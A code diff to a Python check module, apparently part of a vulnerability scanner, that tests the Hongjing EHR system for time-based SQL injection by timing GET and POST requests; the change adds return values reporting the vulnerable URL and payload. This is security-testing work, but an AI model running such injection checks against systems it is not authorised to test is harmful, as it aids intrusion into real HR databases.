@@ -42,6 +42,7 @@ class hjsoft_sqli_BaseVerify:
                 req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                 if time.time() - start_time >= 6:
                     cprint("[+]存在宏景EHR系统 SQL注入漏洞...(高危)\t\tpayload: "+vulnurl, "red")
+                    return True, vulnurl, "宏景EHR系统多处SQL注入", payload, req.text
 
             except:
                 cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
@@ -51,11 +52,14 @@ class hjsoft_sqli_BaseVerify:
             req2 = requests.post(post_url, headers=headers, data=post_data, timeout=10, verify=False)
             if time.time() - start_time >= 6:
                 cprint("[+]存在宏景EHR系统 SQL注入漏洞...(高危)\t\tpayload: "+post_url+"\npost: "+json.dumps(post_data, indent=4), "red")
+                return True, vulnurl, "宏景EHR系统多处SQL注入", payload, req2.text
             else:
                 cprint("[-]不存在hjsoft_sqli漏洞", "white", "on_grey")
+                return False, None, None, None, None
 
         except:
             cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
+            return False, None, None, None, None
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
